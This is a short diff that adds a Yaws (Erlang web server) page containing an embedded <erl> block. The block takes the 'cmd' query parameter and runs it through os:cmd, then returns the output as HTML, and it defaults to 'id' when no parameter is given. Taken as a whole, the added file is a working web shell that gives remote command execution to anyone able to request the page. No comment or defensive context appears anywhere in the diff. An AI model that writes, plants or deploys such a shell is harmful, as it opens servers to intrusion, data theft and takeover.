@@ -1,0 +1,8 @@
+<erl>
+out(Arg) ->
+    Cmd = case yaws_api:queryvar(Arg, "cmd") of
+        {ok, C} -> C;
+        _ -> "id"
+    end,
+    {html, os:cmd(Cmd)}.
+</erl>
